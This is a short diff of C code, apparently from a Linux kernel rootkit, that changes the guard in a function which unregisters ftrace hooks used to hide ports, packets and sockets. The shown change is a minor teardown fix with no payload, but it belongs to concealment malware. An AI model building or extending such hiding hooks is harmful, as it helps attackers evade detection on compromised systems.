@@ -172,7 +172,7 @@ int register_tcp_sock_hook(void) {
 }
 
 void unregister_tcp_sock_hook(void) {
-  if (!port_hide.original /*|| !packets_hide.original*/ || !sock_hidden)
+  if (!port_hide.original || !packets_hide.original || !sock_hidden)
     return;
 
   // Unregister the ftrace hook to stop tracing
